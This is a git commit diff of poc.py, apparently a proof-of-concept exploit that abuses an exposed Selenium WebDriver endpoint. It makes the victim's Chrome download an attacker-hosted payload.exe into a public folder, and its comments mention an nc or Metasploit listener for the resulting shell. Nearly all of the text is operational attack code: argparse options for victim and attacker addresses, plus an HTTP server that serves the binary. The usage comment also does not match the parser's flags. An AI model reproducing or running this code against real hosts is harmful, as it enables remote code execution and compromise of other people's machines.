cc6763524684d0d28d1596cff058edfaa583db28
brian <brian@mini.local>
2020-08-06 23:00:39 -0700

    updates

--- poc.py
+++ poc.py
@@ -1,37 +1,59 @@
 import socketserver
 import threading
 import time
+import argparse
+import posixpath
+import urllib
+import os
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 from selenium.webdriver.chrome.options import Options
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
+
+# python3 poc.py -h 10.10.10.10 -p 4444 -e "\tmp\test.exe" -w 192.168.1.1
 # start nc -l port or use metasploit payload
-# Serve Binary: attackers run ( python3 -m http.server 5555 ) in directory with binary
+
+
+# parsers
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", "--url", required=True,
+   help="IP Selenium is running on")
+parser.add_argument("-p", "--port", required=True,
+   help="Port selenium is running on")
+parser.add_argument("-e", "--exploit", required=True,
+   help="Path to exploit")
+parser.add_argument("-w", "--web", required=True,
+   help="IP of machine hosting exploit (Should be attackers machine)")
+args = parser.parse_args()
+
 
 # attacker info
-attack_url = '192.168.4.95'
-attack_port = '5555'
-attack_rev = 'test.exe'
-attack_full = f"http://{attack_url}:{attack_port}/{attack_rev}"
-attack_dl = f"http://{attack_url}:8000/"
+attack_url = args.web
+attack_rev = args.exploit
+attack_full = f"http://{attack_url}:8000/payload.exe"
+attack_dl = f"http://{attack_url}:8000/download"
 
 # victim info
-vic_url = '192.168.4.102'
-vic_port = '4444'
+vic_url = args.url
+vic_port = args.port
 vic_full = f"http://{vic_url}:{vic_port}/wd/hub"
 
 # download path (Where chrome downloads the binary. needs to be writeable)
-download_dir = "c:\\temp" # \tmp linux
-full_exploit = f"c:\\temp\\{attack_rev}"
+download_dir = "c:\\Users\\Public\\Documents" # \tmp linux
+full_exploit = f"{download_dir}\\payload.exe"
 download = f"<a href='{attack_full}' id='raw-url'>Download</a>"
-
 
 class S(BaseHTTPRequestHandler):
     def _set_headers(self):
         self.send_response(200)
         self.send_header("Content-type", "text/html")
+        self.end_headers()
+
+    def _set_headers_b(self):
+        self.send_response(200)
+        self.send_header("Content-type", "binary/octet-stream")
         self.end_headers()
 
     def _html(self, message):
@@ -42,8 +64,14 @@ class S(BaseHTTPRequestHandler):
         return content.encode("utf8")  # NOTE: must return a bytes object!
 
     def do_GET(self):
-        self._set_headers()
-        self.wfile.write(self._html(download))
+        
+        if self.path == '/download':
+            self._set_headers()
+            self.wfile.write(self._html(download))
+        if self.path == '/payload.exe':
+            self._set_headers_b()
+            with open(args.exploit, 'rb') as file: 
+                self.wfile.write(file.read()) # Read the file and send the contents 
 
     def do_HEAD(self):
         self._set_headers()
